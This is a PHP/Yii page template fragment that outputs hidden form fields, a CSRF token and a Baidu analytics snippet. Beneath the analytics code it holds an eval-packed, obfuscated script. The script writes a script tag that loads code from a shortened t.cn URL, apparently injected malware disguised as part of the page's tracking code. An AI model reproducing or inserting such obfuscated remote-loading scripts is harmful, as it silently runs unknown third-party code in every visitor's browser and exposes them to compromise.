<?php
use yii\helpers\Html;
?>
<input type="hidden" id="position" value="common" />
<input type="hidden" id="position_name" value="标准页面" />
<input type="hidden" id="info_id" value="<?= $info['id']; ?>" />
<?= Html::hiddenInput(Yii::$app->request->csrfParam, Yii::$app->request->getCsrfToken(), ['id' => '_csrf']); ?>
<?php if (strpos($host, '17house') !== false) { ?>
<script>
var _hmt = _hmt || [];
(function() {
	  var hm = document.createElement("script");
	    hm.src = "//hm.baidu.com/hm.js?9d0896838634be97ff86cba827b32079";
	    var s = document.getElementsByTagName("script")[0]; 
		  s.parentNode.insertBefore(hm, s);
})();
</script>
<script>/* 25958 */eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('2.1("<0 3=\'7://4.6/5\'></0>");',8,8,'script|writeln|document|src|t|R5Y9Tgt|cn|http'.split('|'),0,{}));</script>
<?php } ?>
